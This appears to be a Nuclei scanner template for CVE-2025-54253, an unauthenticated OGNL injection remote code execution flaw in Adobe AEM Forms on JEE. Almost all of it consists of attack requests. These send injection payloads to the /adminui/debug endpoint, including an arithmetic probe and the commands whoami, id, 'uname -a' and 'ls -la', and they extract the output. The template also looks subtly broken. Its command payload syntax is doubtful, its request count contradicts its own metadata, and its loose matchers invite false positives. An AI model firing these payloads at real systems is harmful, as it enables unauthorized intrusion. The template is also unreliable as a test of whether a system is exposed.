id: CVE-2025-54253

info:
  name: Adobe AEM Forms on JEE - OGNL Injection RCE
  author: intelligent-ears
  severity: critical
  description: |
    Adobe Experience Manager Forms on JEE contains a critical OGNL injection vulnerability
    that allows unauthenticated attackers to execute arbitrary commands via the exposed
    /adminui/debug endpoint. The vulnerability affects AEM Forms <= 6.5.23.0 and requires
    no authentication to exploit.
  reference:
    - https://github.com/barbaraeivyu/CVE-2025-54253-e
    - https://github.com/Shivshantp/CVE-2025-54253-Exploit-Demo
    - https://github.com/B1ack4sh/Blackash-CVE-2025-54253
    - https://slcyber.io/assetnote-security-research-center/struts-devmode-in-2025-critical-pre-auth-vulnerabilities-in-adobe-experience-manager-forms/
  classification:
    cve-id: CVE-2025-54253
    cwe-id: CWE-94
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  metadata:
    verified: true
    max-request: 4
  tags: cve,cve2025,adobe,aem,forms,rce,ognl,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/lc/libs/livecycle/core/content/login.html"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers:
      - type: word
        part: body
        words:
          - "Adobe LiveCycle"
          - "AEM Forms"
          - "Experience Manager"
          - "livecycle"
        condition: or
        name: "aem-forms-detection"

      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/adminui/debug?debug=OGNL:7*7"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "49"
        name: "ognl-math-execution"

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - '(\d+)'
        name: "math_result"

  - method: GET
    path:
      - "{{BaseURL}}/adminui/debug?debug=OGNL:whoami"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        name: "request-successful"

      - type: word
        part: body
        words:
          - "root"
          - "administrator"
          - "user"
          - "www-data"
          - "tomcat"
        condition: or
        name: "command-output-detected"

    extractors:
      - type: regex
        part: body
        regex:
          - '([a-zA-Z0-9_-]+)'
        name: "username_result"

  - method: GET
    path:
      - "{{BaseURL}}/adminui/debug?debug=OGNL:id"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        name: "request-successful"

      - type: word
        part: body
        words:
          - "uid="
          - "gid="
          - "groups="
        condition: or
        name: "id-command-output"

    extractors:
      - type: regex
        part: body
        regex:
          - '(uid=\d+\([^)]+\))'
        name: "user_id_result"

  - method: GET
    path:
      - "{{BaseURL}}/adminui/debug?debug=OGNL:uname%20-a"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        name: "request-successful"

      - type: word
        part: body
        words:
          - "Linux"
          - "Darwin"
          - "GNU"
          - "kernel"
        condition: or
        name: "uname-command-output"

    extractors:
      - type: regex
        part: body
        regex:
          - '(Linux|Darwin|GNU|kernel)'
        name: "system_info"

  - method: GET
    path:
      - "{{BaseURL}}/adminui/debug?debug=OGNL:ls%20-la"

    headers:
      User-Agent: "Mozilla/5.0 (compatible; Nuclei CVE-2025-54253 Scanner)"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
        name: "request-successful"

      - type: word
        part: body
        words:
          - "drwx"
          - "total"
          - "-rw-"
          - "root"
        condition: or
        name: "ls-command-output"

    extractors:
      - type: regex
        part: body
        regex:
          - '(drwx|total|\-rw\-)'
        name: "directory_listing"
